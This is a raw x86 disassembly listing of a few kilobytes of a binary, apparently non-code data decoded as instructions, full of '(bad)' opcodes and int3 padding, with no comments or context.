  441f0f:	or     DWORD PTR [ebx+eax*4+0x9],0x64
  441f14:	int3   
  441f15:	mov    ebp,0xffceffff
  441f1a:	jecxz  0x441edc
  441f1c:	add    BYTE PTR [ebx+eax*4],al
  441f1f:	cmp    DWORD PTR [ebp-0x1],0xfffffffa
  441f23:	mov    cl,0xff
  441f25:	jl     0x441ef3
  441f27:	add    BYTE PTR [ecx-0x7fac01],cl
  441f2d:	repz add BYTE PTR [eax],al
  441f30:	fwait
  441f31:	add    BYTE PTR [ebx+0x62],bl
  441f34:	sbb    DWORD PTR [ecx-0x7d],0xffffff83
  441f38:	int3   
  441f39:	int3   
  441f3a:	int3   
  441f3b:	int3   
  441f3c:	int3   
  441f3d:	int3   
  441f3e:	int3   
  441f3f:	int3   
  441f40:	js     0x441f42
  441f42:	add    bh,bh
  441f44:	pop    edx
  441f45:	sub    eax,0x83ff20d6
  441f4a:	add    bh,bh
  441f4c:	cmp    DWORD PTR [ebx-0x34],0x19
  441f50:	sub    eax,0x4ff0000
  441f55:	xchg   DWORD PTR [esi+0x47],ebp
  441f58:	(bad)  
  441f59:	inc    DWORD PTR [eax]
  441f5b:	(bad)  
  441f5c:	(bad)  
  441f5d:	cmp    eax,0xbe8e83
  441f62:	add    BYTE PTR [ecx+0x55ef9c73],cl
  441f68:	add    bh,bh
  441f6a:	add    BYTE PTR [ebx+0x12a602cc],al
  441f70:	idiv   edi
  441f72:	add    BYTE PTR [eax],al
  441f74:	inc    esi
  441f75:	das    
  441f76:	dec    ecx
  441f77:	in     eax,0xcc
  441f79:	int3   
  441f7a:	dec    esp
  441f7c:	mov    DWORD PTR [edi+0x33],eax
  441f7f:	sbb    ebx,DWORD PTR [eax+eax*1-0x1]
  441f83:	cmp    ebx,0xfffffffe
  441f86:	lock aas 
  441f88:	int3   
  441f89:	inc    DWORD PTR [eax]
  441f8b:	add    BYTE PTR [eax],al
  441f8d:	arpl   WORD PTR [edi],ax
  441f8f:	inc    esi
  441f90:	xor    DWORD PTR [eax],eax
  441f92:	add    BYTE PTR [ecx-0x3561ecf2],cl
  441f98:	int3   
  441f99:	(bad)  
  441f9a:	inc    DWORD PTR [eax]
  441f9c:	or     DWORD PTR [esi+0x20],0x47
  441fa0:	pop    es
  441fa1:	(bad)  
  441fa2:	inc    DWORD PTR [ebx-0x15550826]
  441fa8:	(bad)  
  441fa9:	(bad)  
  441faa:	(bad)  
  441fab:	inc    DWORD PTR [eax]
  441fad:	add    cl,BYTE PTR [ebx]
  441faf:	leave  
  441fb0:	aas    
  441fb1:	cmp    edi,0x0
  441fb4:	mov    ss,WORD PTR [esi+0x52]
  441fb7:	add    al,0x83
  441fb9:	(bad)  
  441fba:	(bad)  
  441fbb:	inc    DWORD PTR [ebx-0x7ace72de]
  441fc1:	inc    DWORD PTR [eax]
  441fc3:	add    BYTE PTR [ebp-0x49],bh
  441fc6:	es inc esi
  441fc8:	int3   
  441fc9:	cmp    edi,0xffffff83
  441fcc:	jmp    FWORD PTR [ecx]
  441fce:	addr16 inc edx
  441fd0:	dec    ecx
  441fd1:	(bad)  
  441fd2:	(bad)  
  441fd3:	call   DWORD PTR [edx]
  441fd5:	(bad)  
  441fd6:	add    al,0x23
  441fd8:	int3   
  441fd9:	inc    DWORD PTR [eax]
  441fdb:	add    BYTE PTR [ebx+0x6b2dc8e1],al
  441fe1:	cmp    edi,0xffffffff
  441fe4:	mov    ds:0xcc30ebba,al
  441fe9:	inc    DWORD PTR [eax]
  441feb:	inc    DWORD PTR [eax]
  441fed:	neg    ah
  441fef:	xchg   ebp,eax
  441ff0:	cs add bh,bh
  441ff3:	inc    DWORD PTR [edx]
  441ff5:	dec    esi
  441ff6:	sbb    eax,0x89ff0098
  441ffb:	add    BYTE PTR [ecx-0x20960320],cl
  442001:	dec    esp
  442003:	dec    DWORD PTR [edi+ebx*2]
  442006:	jp     0x441fe4
  442008:	inc    DWORD PTR [eax]
  44200a:	int3   
  44200b:	(bad)  
  44200c:	call   DWORD PTR [ecx+0x3c]
  44200f:	mov    esi,0xffff83ea
  442014:	daa    
  442015:	rcr    DWORD PTR [ebx-0xff93],cl
  44201b:	add    bh,bh
  44201d:	sbb    dh,BYTE PTR [eax]
  44201f:	dec    ebx
  442020:	int3   
  442021:	inc    DWORD PTR [eax]
  442023:	add    dl,ch
  442025:	lods   al,BYTE PTR ds:[esi]
  442026:	shr    BYTE PTR [esp+ecx*8-0x3300337d],cl
  44202d:	jg     0x4420a2
  44202f:	lock test DWORD PTR [ebx+0x46ec00ff],eax
  442036:	add    BYTE PTR [ecx],cl
  442038:	inc    DWORD PTR [eax]
  44203a:	dec    esp
  44203c:	add    ebx,0x7a
  44203f:	test   eax,0xff00ff9c
  442044:	lock or cl,ah
  442047:	dec    ebx
  442048:	add    DWORD PTR [eax],0xffffffff
  44204b:	add    DWORD PTR [eax],0x1d
  44204e:	mov    al,ds:0xff25df
  442053:	(bad)  
  442054:	in     al,dx
  442055:	push   es
  442056:	sub    ah,BYTE PTR [eax-0x7d]
  442059:	int3   
  44205a:	inc    DWORD PTR [eax]
  44205c:	sub    DWORD PTR [ebx+eax*2+0x21],0x34
  442061:	int3   
  442062:	(bad)  
  442063:	push   DWORD PTR [edi-0x7c4066e4]
  442069:	add    BYTE PTR [ebx-0x42460001],al
  44206f:	sbb    eax,0xccff89c6
  442074:	into   
  442075:	ja     0x442028
  442077:	adc    eax,0xff00ff00
  44207c:	(bad)  
  44207d:	call   0x11befba
  442082:	add    BYTE PTR [ebx-0x1e28a96],al
  442088:	add    bh,bh
  44208a:	dec    esp
  44208c:	dec    ebp
  44208e:	lods   al,BYTE PTR ds:[esi]
  44208f:	sub    ch,dh
  442091:	add    bh,bh
  442093:	add    BYTE PTR [ebx+0x73],dl
  442096:	or     al,0xda
  442098:	add    BYTE PTR [eax],al
  44209a:	(bad)  
  44209b:	inc    DWORD PTR [ebx-0x7b3606f3]
  4420a1:	dec    DWORD PTR [ecx-0x5ab08c01]
  4420a7:	jmp    0xf5ff:0xccff00
  4420ae:	int3   
  4420af:	xor    esp,ecx
  4420b1:	inc    DWORD PTR [eax]
  4420b3:	sub    DWORD PTR [ebx-0x28],0xffffff96
  4420b7:	dec    ecx
  4420b8:	int3   
  4420b9:	mov    edi,edi
  4420bb:	add    bh,bh
  4420bd:	loop   0x4420ad
  4420bf:	dec    esp
  4420c0:	mov    edi,0x2983ffff
  4420c5:	pushf  
  4420c6:	fs cdq 
  4420c8:	add    bh,bh
  4420ca:	inc    DWORD PTR [eax]
  4420cc:	cmp    DWORD PTR [ebx-0x3359a0f5],0xffffffff
  4420d3:	cmp    DWORD PTR [ebp-0x7c8a17b2],0x0
  4420da:	mov    DWORD PTR [ebx+0x5a4f8dff],eax
  4420e0:	jb     0x4420e2
  4420e2:	int3   
  4420e3:	add    BYTE PTR [esi-0x5d],dh
  4420e6:	add    al,0x93
  4420e8:	add    BYTE PTR [ebx-0x437c0001],al
  4420ee:	jns    0x4420d0
  4420f0:	in     eax,dx
  4420f1:	add    BYTE PTR [eax],al
  4420f3:	add    BYTE PTR [edi-0xf7330f],cl
  4420f9:	add    BYTE PTR [eax],al
  4420fb:	(bad)  
  4420fc:	jmp    FWORD PTR [ebx]
  4420fe:	adc    DWORD PTR [ebx],eax
  442100:	inc    esp
  442101:	dec    esp
  442103:	add    dl,ah
  442105:	loop   0x442158
  442107:	add    BYTE PTR [ebx-0x1],al
  44210d:	mov    dh,0x1e
  44210f:	dec    esi
  442110:	sbb    eax,0x400ffff
  442115:	xor    ah,bl
  442117:	retf   
  442118:	dec    DWORD PTR [ecx+0x34008983]
  44211e:	test   eax,eax
  442120:	add    al,BYTE PTR [eax]
  442122:	dec    DWORD PTR [ecx-0x6ae4b9bd]
  442128:	int3   
  442129:	add    BYTE PTR [eax],al
  44212b:	inc    DWORD PTR [ebx-0x72c24823]
  442131:	inc    DWORD PTR [eax]
  442133:	jmp    DWORD PTR [ecx]
  442135:	jne    0x44211b
  442137:	push   ebp
  442138:	add    BYTE PTR [ecx-0x62000034],cl
  44213e:	aas    
  44213f:	(bad)  
  442140:	pop    eax
  442141:	inc    DWORD PTR [eax]
  442143:	(bad)  
  442144:	out    dx,eax
  442145:	add    BYTE PTR [edx*8-0x7cff01],bh
  44214c:	sbb    DWORD PTR [ebp-0x900eaa],0x0
  442153:	and    ebx,0xffffff8f
  442156:	sbb    ecx,DWORD PTR [ebx+0xcc]
  44215c:	(bad)  
  44215d:	jmp    0xe90945
  442162:	add    bh,bh
  442164:	shl    ebx,1
  442166:	jle    0x442182
  442168:	inc    DWORD PTR [eax]
  44216a:	add    bh,bh
  44216c:	int3   
  44216d:	bnd jno 0x4421c3
  442170:	out    dx,eax
  442171:	inc    DWORD PTR [eax]
  442173:	jmp    esi
  442175:	std    
  442176:	pusha  
  442177:	sbb    cl,ah
  442179:	(bad)  
  44217a:	inc    DWORD PTR [eax]
  44217c:	add    ah,bh
  44217e:	inc    edi
  44217f:	int    0xac
  442181:	(bad)  
  442182:	inc    DWORD PTR [ebx-0x31920a54]
  442188:	inc    DWORD PTR [eax]
  44218a:	inc    DWORD PTR [eax]
  44218c:	add    BYTE PTR [ebp+0x3],dh
  44218f:	movntq (bad),mm7
  442190:	out    0xff,eax
  442192:	or     esp,0xffffffac
  442195:	arpl   WORD PTR [edx+edi*4-0x1],bx
  442199:	add    BYTE PTR [ecx-0x8d4007d],cl
  44219f:	jg     0x44220f
  4421a1:	inc    DWORD PTR [eax]
  4421a3:	add    al,bh
  4421a5:	dec    ebx
  4421a6:	xor    bl,BYTE PTR [edx-0x7cff7c01]
  4421ac:	and    edx,0xffffffa1
  4421af:	rcr    dh,1
  4421b1:	add    BYTE PTR [eax],al
  4421b3:	call   DWORD PTR [edi-0x6c8449]
  4421b9:	int3   
  4421ba:	dec    DWORD PTR [ecx-0x63258f01]
  4421c0:	push   0x9a00cc83
  4421c5:	xchg   DWORD PTR ds:0x89ffff3b,edi
  4421cb:	mov    edi,edi
  4421cd:	xchg   BYTE PTR [esi],bl
  4421cf:	test   ah,bh
  4421d1:	inc    DWORD PTR [eax]
  4421d3:	add    cl,cl
  4421d5:	popf   
  4421d6:	sbb    esp,ebp
  4421d8:	(bad)  
  4421d9:	dec    DWORD PTR [ecx+0x7b220000]
  4421df:	jp     0x442175
  4421e1:	add    bh,bh
  4421e3:	add    BYTE PTR [ebx+0x2c],bh
  4421e6:	imul   edi,DWORD PTR [edx-0x1],0xff0000cc
  4421ed:	pop    es
  4421ee:	sbb    al,0xb
  4421f0:	xor    eax,0xf5830000
  4421f5:	cwde   
  4421f6:	loopne 0x44217d
  4421f8:	mov    DWORD PTR [eax],eax
  4421fa:	cmp    edi,0xffffffff
  4421fd:	xlat   BYTE PTR ds:[ebx]
  4421fe:	xchg   edx,eax
  4421ff:	out    0xde,eax
  442201:	inc    DWORD PTR [eax]
  442203:	add    BYTE PTR ds:0xff280730,dl
  442209:	(bad)  
  44220a:	(bad)  
  44220b:	(bad)  
  44220c:	(bad)  
  44220d:	stc    
  44220e:	pop    eax
  44220f:	sbb    al,0xcc
  442211:	add    bh,bh
  442213:	or     esp,0x2e
  442216:	cmp    eax,DWORD PTR [edx-0x7c00007d]
  44221c:	jmp    DWORD PTR [eax+0x9d6108]
  442222:	int3   
  442223:	dec    DWORD PTR [esi+0x4e6acb]
  442229:	add    bh,bh
  44222b:	inc    DWORD PTR [eax]
  44222d:	xchg   ecx,eax
  44222e:	popa   
  44222f:	adc    dl,BYTE PTR [eax-0x34]
  442232:	(bad)  
  442233:	(bad)  
  442234:	jg     0x442220
  442236:	fld    DWORD PTR [ebx]
  442238:	add    bh,bh
  44223a:	inc    DWORD PTR [eax]
  44223c:	jmp    ecx
  44223e:	mov    al,ds:0xffcca4c7
  442243:	xor    DWORD PTR [edi-0x78],0xfffffff9
  442247:	repnz (bad) 
  442249:	(bad)  
  44224a:	(bad)  
  44224b:	(bad)  
  44224c:	jmp    DWORD PTR [ecx+0x34]
  44224f:	btr    DWORD PTR [eax],eax
  442252:	inc    DWORD PTR [eax]
  442254:	outs   dx,BYTE PTR ds:[esi]
  442255:	sub    edi,eax
  442257:	mov    DWORD PTR [eax],0xcc83ff00
  44225d:	lea    esi,[eax-0x7c00c3e9]
  442263:	inc    DWORD PTR [ebp-0x33e3d646]
  442269:	add    BYTE PTR [ebx-0x7e380001],al
  44226f:	icebp  
  442270:	xchg   esi,eax
  442271:	add    BYTE PTR [eax],al
  442273:	mov    eax,eax
  442275:	mov    al,BYTE PTR [edx]
  442277:	add    eax,0xff0089ff
  44227c:	jmp    DWORD PTR [esi+ecx*1]
  44227f:	mov    ebx,0xff83ff29
  442284:	pop    ebx
  442285:	hlt    
  442286:	add    dh,ch
  442288:	add    bh,bh
  44228a:	cmp    edi,0xffffff83
  44228d:	or     BYTE PTR [esi],bh
  44228f:	jbe    0x4422d3
  442291:	mov    edi,edi
  442293:	add    BYTE PTR [edx-0x60],al
  442296:	xchg   BYTE PTR [ebx-0x1],dl
  442299:	(bad)  
  44229a:	dec    esp
  44229c:	add    BYTE PTR [eax-0x7c92171a],al
  4422a2:	dec    DWORD PTR [ecx+0x3521167f]
  4422a8:	(bad)  
  4422a9:	(bad)  
  4422aa:	(bad)  
  4422ab:	inc    DWORD PTR [ebx+0xdaa6696]
  4422b1:	add    bh,bh
  4422b3:	push   DWORD PTR [edx+0x68]
  4422b6:	jmp    0xff44a6b1
  4422bb:	dec    esp
  4422bd:	sbb    BYTE PTR [ebx-0x7d1c],cl
  4422c3:	(bad)  
  4422c4:	jl     0x44231f
  4422c6:	mov    ah,0xf0
  4422c8:	(bad)  
  4422c9:	inc    DWORD PTR [eax]
  4422cb:	int3   
  4422cc:	add    BYTE PTR [edi],ch
  4422ce:	cmp    ch,BYTE PTR [edx+0xffffcb]
  4422d4:	(bad)  
  4422d6:	out    0x2e,eax
  4422d8:	add    ah,cl
  4422da:	add    DWORD PTR [eax],0x0
  4422dd:	addr16 push 0xff00e14b
  4422e3:	int3   
  4422e4:	daa    
  4422e5:	mov    dh,0xbc
  4422e7:	push   ds
  4422e8:	(bad)  
  4422e9:	inc    DWORD PTR [ebx+0x395fffcc]
  4422ef:	test   DWORD PTR [eax+eax*1],ebx
  4422f2:	inc    DWORD PTR [eax]
  4422f4:	aas    
  4422f5:	add    edx,ebx
  4422f7:	cmp    eax,0x83ffff89
  4422fc:	(bad)  
  4422fd:	mov    ebp,0xffc63100
  442302:	int3   
  442303:	add    BYTE PTR [ecx+0x19],ch
  442306:	loope  0x4422de
  442308:	inc    DWORD PTR [eax]
  44230a:	(bad)  
  44230b:	(bad)  
  44230c:	inc    DWORD PTR [edi+0x33]
  44230f:	into   
  442310:	test   BYTE PTR [ecx+0x147aff83],cl
  442316:	imul   eax,esi,0xffffffff
  442319:	(bad)  
  44231a:	(bad)  
  44231b:	inc    DWORD PTR [eax]
  44231d:	dec    edx
  44231e:	dec    ecx
  44231f:	popf   
  442320:	add    eax,DWORD PTR [ebx-0x7de0100]
  442326:	shl    cl,cl
  442328:	(bad)  
  442329:	inc    DWORD PTR [ebx-0x2cb1007d]
  44232f:	add    eax,0xffff89f6
  442334:	in     eax,0xa
  442336:	dec    edi
  442337:	push   ecx
  442338:	(bad)  
  442339:	(bad)  
  44233a:	inc    DWORD PTR [eax]
  44233c:	add    BYTE PTR [ebp+0x8228d8],al
  442342:	add    BYTE PTR [eax],al
  442344:	das    
  442345:	fs sub eax,0xffccffbd
  44234b:	inc    DWORD PTR [eax]
  44234d:	xchg   ebp,eax
  44234e:	mov    esi,DWORD PTR [eax]
  442350:	sbb    eax,DWORD PTR [ebx-0x4b4c3400]
  442356:	out    dx,eax
  442357:	mov    edx,0xffff00ff
  44235c:	add    BYTE PTR [ebx+ebp*1],bl
  44235f:	imul   ebp,DWORD PTR [ecx],0xffffffcc
  442362:	(bad)  
  442363:	(bad)  
  442364:	mov    eax,0x835b0c2c
  442369:	inc    DWORD PTR [eax]
  44236b:	inc    DWORD PTR [eax]
  44236d:	fsubr  QWORD PTR [edx+0x19]
  442370:	sub    bh,bh
  442372:	int3   
  442373:	call   DWORD PTR [esi]
  442375:	int3   
  442376:	(bad)  
  442377:	sar    edi,0x0
  44237a:	add    bh,bh
  44237c:	mov    edx,esi
  44237e:	adc    dl,bl
  442380:	int3   
  442381:	(bad)  
  442382:	(bad)  
  442383:	(bad)  
  442384:	mov    ebp,0x1ee987
  442389:	mov    DWORD PTR [eax],eax
  44238b:	add    bh,bh
  44238d:	enter  0x7a15,0xda
  442391:	add    DWORD PTR [eax],0xffffffff
  442394:	or     BYTE PTR [esi+esi*4+0x8989e3],bl
  44239b:	cmp    edi,0x15
  44239e:	mov    eax,0xff8354e1
  4423a3:	(bad)  
  4423a4:	jl     0x4423de
  4423a6:	icebp  
  4423a7:	(bad)  
  4423a8:	(bad)  
  4423a9:	dec    esp
  4423ab:	dec    DWORD PTR [ecx-0x7ef574e1]
  4423b1:	add    BYTE PTR [eax],al
  4423b3:	add    ah,ah
  4423b5:	adc    ebx,ebp
  4423b7:	in     al,0x83
  4423b9:	inc    DWORD PTR [eax]
  4423bb:	add    bh,bh
  4423bd:	fidiv  DWORD PTR [ecx]
  4423bf:	shl    BYTE PTR [edi+0x50000ff],cl
  4423c5:	adc    BYTE PTR [edx+0xffa9],dl
  4423cb:	add    BYTE PTR [eax],al
  4423cd:	std    
  4423ce:	xor    BYTE PTR [esi+0x34],ch
  4423d1:	add    BYTE PTR [eax],al
  4423d3:	call   DWORD PTR [edi+0x5c]
  4423d6:	push   edx
  4423d7:	adc    bh,bh
  4423d9:	mov    DWORD PTR [ebx-0x4d7e7d00],eax
  4423df:	xor    DWORD PTR [edi+0x1bccffff],ebx
  4423e5:	add    DWORD PTR [edx-0xff001c],edx
  4423eb:	(bad)  
  4423ec:	(bad)  
  4423ed:	fisttp DWORD PTR [ebx]
  4423ef:	mov    dl,0xc6
  4423f1:	int3   
  4423f2:	(bad)  
  4423f3:	inc    DWORD PTR [ebp-0x3310f422]
  4423f9:	add    ah,cl
  4423fb:	(bad)  
  4423fc:	jmp    DWORD PTR [eax-0x1]
  4423ff:	jl     0x442467
  442401:	(bad)  
  442402:	dec    esp
  442404:	call   0xffdf29d5
  442409:	(bad)  
  44240a:	inc    DWORD PTR [eax]
  44240c:	inc    DWORD PTR [edi]
  44240e:	xchg   ch,ah
  442410:	jle    0x442395
  442412:	cmp    edi,0xffffffc2
  442415:	xor    DWORD PTR [ecx+eax*1],edx
  442418:	(bad)  
  442419:	(bad)  
  44241a:	inc    DWORD PTR [eax]
  44241c:	xor    DWORD PTR [edx-0x1c],0x74
  442420:	and    eax,DWORD PTR [eax]
  442422:	add    bh,bh
  442424:	sbb    ch,0x84
  442427:	add    bh,bh
  442429:	(bad)  
  44242a:	(bad)  
  44242b:	(bad)  
  44242c:	dec    DWORD PTR [edi]
  44242e:	mov    eax,ds:0x8a7c
  442433:	add    BYTE PTR [edi+0x47],al
  442436:	jb     0x4423ce
  442438:	dec    esp
  44243a:	add    bh,bh
  44243c:	(bad)  
  44243d:	mov    ecx,0xff681a94
  442442:	add    bh,bh
  442444:	test   DWORD PTR [edi+0x45],esi
  442447:	test   DWORD PTR [eax],eax
  442449:	dec    esp
  44244b:	add    DWORD PTR [eax],0xffffffdc
  44244e:	sub    BYTE PTR ds:0x42,al
  442454:	sub    esi,DWORD PTR [ebx-0x33006a41]
  44245a:	inc    DWORD PTR [eax]
  44245c:	(bad)  
  44245d:	inc    BYTE PTR [edx-0x51]
  442460:	ret    
  442461:	add    bh,bh
  442463:	xor    ebx,0xffffffff
  442466:	push   ss
  442467:	and    eax,0xffffccff
  44246c:	add    BYTE PTR [ebx],bh
  44246e:	mov    WORD PTR [esi],cs
  442470:	xlat   BYTE PTR ds:[ebx]
  442471:	cmp    edi,0xffffffff
  442474:	mov    DWORD PTR [esi+0x74],edi
  442477:	lahf   
  442478:	(bad)  
  442479:	(bad)  
  44247a:	(bad)  
  44247b:	(bad)  
  44247c:	inc    DWORD PTR [esi+edi*2]
  44247f:	es pop ds
  442481:	add    BYTE PTR [ebx+0x1d803fff],al
  442487:	cs cmp edi,0xffffffff
  44248b:	mov    DWORD PTR [eax],eax
  44248d:	push   es
  44248e:	pop    es
  44248f:	cwde   
  442490:	xchg   esp,eax
  442491:	add    BYTE PTR [ebx+0x1e39f9ff],al
  442497:	pop    ebx
  442498:	add    bh,bh
  44249a:	inc    DWORD PTR [eax]
  44249c:	add    ah,cl
  44249e:	test   eax,0xff0fae
  4424a3:	call   DWORD PTR [ebx-0x72]
  4424a6:	adc    BYTE PTR [edx],dh
  4424a8:	inc    DWORD PTR [ebx+0x2683ffff]
  4424ae:	pop    ds
  4424af:	sub    DWORD PTR [eax+0x0],esp
  4424b2:	add    DWORD PTR [ebx-0x37129ddb],0xffffffff
  4424b9:	add    DWORD PTR [eax],0x0
  4424bc:	add    BYTE PTR [ebp-0x69ae1],cl
  4424c2:	add    DWORD PTR [ebx-0x33a0fd32],0xffffffff
  4424c9:	add    bh,bh
  4424cb:	(bad)  
  4424cc:	call   DWORD PTR ds:0xffc7ee2c
  4424d2:	int3   
  4424d3:	add    dh,bh
  4424d5:	inc    eax
  4424d6:	mov    DWORD PTR [ebx],eax
  4424d8:	add    bh,bh
  4424da:	(bad)  
  4424db:	inc    DWORD PTR [eax]
  4424dd:	mov    eax,ds:0x83628226
  4424e2:	add    DWORD PTR [eax],0xffffffa8
  4424e5:	jecxz  0x44254b
  4424e7:	sar    edi,1
  4424e9:	add    BYTE PTR [eax],al
  4424eb:	(bad)  
  4424ec:	call   FWORD PTR [edx]
  4424ee:	shr    BYTE PTR [esi],1
  4424f0:	enter  0xffff,0x83
  4424f4:	int    0x70
  4424f6:	mov    al,ds:0xffffff1c
  4424fb:	dec    esp
  4424fd:	repz pop edi
  4424ff:	add    al,0xdd
  442501:	add    BYTE PTR [eax],al
  442503:	inc    ecx
  442505:	test   BYTE PTR [esi-0x45],dh
  442508:	(bad)  
  442509:	inc    DWORD PTR [eax]
  44250b:	inc    DWORD PTR [eax]
  44250d:	sub    al,0x74
  44250f:	push   ss
  442510:	dec    edx
  442511:	add    BYTE PTR [eax],al
  442513:	int3   
  442514:	jecxz  0x442568
  442516:	jb     0x4424d4
  442518:	inc    DWORD PTR [eax]
  44251a:	dec    esp
  44251c:	add    BYTE PTR [eax],al
  44251e:	mov    dh,0x7b
  442520:	lahf   
  442521:	dec    esp
  442523:	add    BYTE PTR [ebx+0x41],cl
  442526:	stos   BYTE PTR es:[edi],al
  442527:	pop    esp
  442528:	(bad)  
  442529:	inc    DWORD PTR [eax]
  44252b:	(bad)  
  44252c:	inc    edi
  44252e:	aam    0xe4
  442530:	push   esi
  442531:	add    BYTE PTR [eax],al
  442533:	call   DWORD PTR [edi+0x529ab5]
  442539:	add    ah,cl
  44253b:	mov    edi,edi
  44253d:	or     ch,BYTE PTR [edx]
  44253f:	inc    eax
  442540:	gs (bad) 
  442542:	(bad)  
  442543:	inc    DWORD PTR [ecx+0x23]
  442546:	sub    BYTE PTR [ecx-0x1],dh
  442549:	inc    DWORD PTR [eax]
  44254b:	inc    DWORD PTR [eax]
  44254d:	ror    BYTE PTR [edx],cl
  44254f:	arpl   WORD PTR ds:0x18ccff00,dx
  442555:	idiv   BYTE PTR [edi+0xcc28]
  44255b:	add    BYTE PTR [ecx+0x6ea31922],cl
  442561:	add    BYTE PTR [ebx+0x441db100],al
  442567:	mov    DWORD PTR [ebx-0x33ff0077],eax
  44256d:	mov    ?,WORD PTR [edi]
  44256f:	test   DWORD PTR [edi],esi
  442571:	mov    DWORD PTR [eax],eax
  442573:	add    BYTE PTR [ebp-0x1c],bh
  442576:	mov    ch,0x12
  442578:	cmp    edi,0x0
  44257b:	inc    DWORD PTR [eax]
  44257d:	jbe    0x4425ed
  44257f:	test   BYTE PTR [ecx+0x0],dl
  442582:	add    DWORD PTR [eax],0xffffffd9
  442585:	loope  0x44253e
  442587:	repnz int3 
  442589:	add    bh,bh
  44258b:	inc    DWORD PTR [eax]
  44258d:	ror    BYTE PTR [edx-0xa36],cl
  442593:	dec    DWORD PTR [ecx-0x49]
  442596:	bound  ecx,QWORD PTR [ebx-0x7d]
  442599:	inc    DWORD PTR [eax]
  44259b:	cmp    edi,0xffffff95
  44259e:	test   eax,0xff00dc0d
  4425a3:	inc    DWORD PTR [eax+edx*2+0x73]
  4425a7:	stos   DWORD PTR es:[edi],eax
  4425a8:	(bad)  
  4425a9:	dec    DWORD PTR [ecx+0x10550000]
  4425af:	jg     0x442574
  4425b1:	dec    DWORD PTR [ecx+0xc1f3a00]
  4425b7:	mov    DWORD PTR [ebx-0x7cff01],0x6f0f2273
  4425c1:	add    BYTE PTR [ebx+0x6626f4ff],al
  4425c7:	pop    edi
  4425c8:	int3   
  4425c9:	inc    DWORD PTR [eax]
  4425cb:	cmp    edi,0xffffffde
  4425ce:	hlt    
  4425cf:	mov    dl,0x40
  4425d1:	mov    edi,edi
  4425d3:	jmp    FWORD PTR [edx*8-0x7c7c8301]
  4425da:	add    BYTE PTR [ebx-0x61199601],al
  4425e0:	pushf  
  4425e1:	(bad)  
  4425e2:	dec    esp
  4425e4:	adc    ebx,esp
  4425e6:	cmp    dl,BYTE PTR [edi+0x0]
  4425e9:	add    BYTE PTR [eax],al
  4425eb:	inc    DWORD PTR [eax]
  4425ed:	les    eax,FWORD PTR ds:0xff45b7
  4425f3:	int3   
  4425f4:	sub    al,0xe3
  4425f6:	xchg   ebp,eax
  4425f7:	inc    eax
  4425f8:	add    bh,bh
  4425fa:	inc    DWORD PTR [ebx+0x2ba5b089]
  442600:	lea    eax,[ebx+0x6bc2ff83]
  442606:	xbegin 0x144260b
  44260c:	jmp    DWORD PTR [ebx-0x43]
  44260f:	mov    dh,0x4f
  442611:	dec    DWORD PTR [ecx-0x1ccac87d]
  442617:	cli    
  442618:	(bad)  
  442619:	(bad)  
  44261a:	inc    DWORD PTR [eax]
  44261c:	add    BYTE PTR [eax],dl
  44261e:	jmp    0xfff:0x83ff74d1
  442625:	out    0xd8,eax
  442627:	mov    ah,0xff
  442629:	add    bh,bh
  44262b:	add    DWORD PTR [eax],0xffffffc1
  44262e:	retf   
  44262f:	int    0x57
  442631:	inc    DWORD PTR [eax]
  442633:	call   FWORD PTR ds:0xffdce3bd
  442639:	add    BYTE PTR [eax],al
  44263b:	add    BYTE PTR [eax],al
  44263d:	pop    es
  44263e:	pop    esi
  44263f:	cwde   
  442640:	add    edi,edi
  442642:	(bad)  
  442643:	(bad)  
  442644:	aas    
  442645:	mov    ebp,fs
  442647:	pop    esi
  442648:	add    bh,bh
  44264a:	add    BYTE PTR [ebx-0x1a0d500],al
  442650:	(bad)  
  442651:	inc    DWORD PTR [ebx-0x54838f00]
  442657:	jne    0x442659
  442659:	(bad)  
  44265a:	dec    esp
  44265c:	jmp    FWORD PTR [esi]
  44265e:	icebp  
  44265f:	cwde   
  442660:	sub    ecx,esp
  442662:	add    ah,cl
  442664:	and    ebp,ebx
  442666:	test   al,0xac
  442668:	add    DWORD PTR [eax],0xffffff83
  44266b:	mov    edi,edi
  44266d:	pop    edx
  44266e:	jmp    0x435033
  442673:	add    BYTE PTR [ecx+0x79],ch
  442676:	fs push ebp
  442678:	add    bh,bh
  44267a:	add    BYTE PTR [eax],al
  44267c:	call   FWORD PTR [ebx+0x473861]
  442682:	inc    DWORD PTR [eax]
  442684:	and    eax,DWORD PTR [ebp-0xfffc51]
  44268a:	(bad)  
  44268b:	(bad)  
  44268c:	jmp    DWORD PTR [edi+0x7c]
  44268f:	dec    eax
  442690:	fld    DWORD PTR [ebx-0x19207700]
  442696:	loop   0x4426b9
  442698:	add    BYTE PTR [eax],al
  44269a:	cmp    edi,0x0
  44269d:	xchg   esp,eax
  44269e:	lock inc ebx
  4426a0:	add    BYTE PTR gs:[eax],al
  4426a3:	inc    DWORD PTR [ebx]
  4426a5:	scas   eax,DWORD PTR es:[edi]
  4426a6:	sbb    BYTE PTR [ebp+0x0],bh
  4426a9:	add    BYTE PTR [eax],al
  4426ab:	cmp    edi,0xffffffbb
  4426ae:	dec    edx
  4426af:	call   0x3eff:0xff
  4426b5:	pop    ss
  4426b6:	(bad)  [ecx+0x0]
  4426b9:	(bad)  
  4426ba:	inc    DWORD PTR [eax]
  4426bc:	int3   
  4426bd:	cmc    
  4426be:	(bad)  
  4426bf:	lahf   
  4426c0:	lds    eax,FWORD PTR [eax]
  4426c2:	add    DWORD PTR [ebx-0x575ceded],0xffffff83
  4426c9:	int3   
  4426ca:	(bad)  
  4426cb:	(bad)  
  4426cc:	call   DWORD PTR [ebx-0x76]
  4426cf:	jg     0x4426b3
  4426d1:	add    bh,bh
  4426d3:	(bad)  
  4426d4:	fidivr WORD PTR [eax]
  4426d6:	je     0x4426ee
  4426d8:	add    BYTE PTR [eax],al
  4426da:	inc    DWORD PTR [eax]
  4426dc:	dec    DWORD PTR [edx+0xb]
  4426df:	mov    eax,ds:0x83ffbc
  4426e4:	mov    WORD PTR [ebx+0x40],ds
  4426e7:	rol    BYTE PTR [ebx-0x3400],0xee
  4426ee:	test   al,0x3b
  4426f0:	pop    eax
  4426f1:	(bad)  
  4426f2:	dec    DWORD PTR [ecx+0x3efbfb2a]
  4426f8:	inc    DWORD PTR [ebx+0x3a0000cc]
  4426fe:	mov    eax,0xffff848b
  442703:	int3   
  442704:	mov    ecx,0xcce767a1
  442709:	add    BYTE PTR [ebx-0x3b65007d],al
  44270f:	pop    eax
  442710:	loope  0x442712
  442712:	(bad)  
  442713:	call   FWORD PTR [edi-0x36]
  442716:	mov    edx,0xffb5
  44271b:	inc    DWORD PTR [ebx-0xd2bf894]
  442721:	(bad)  
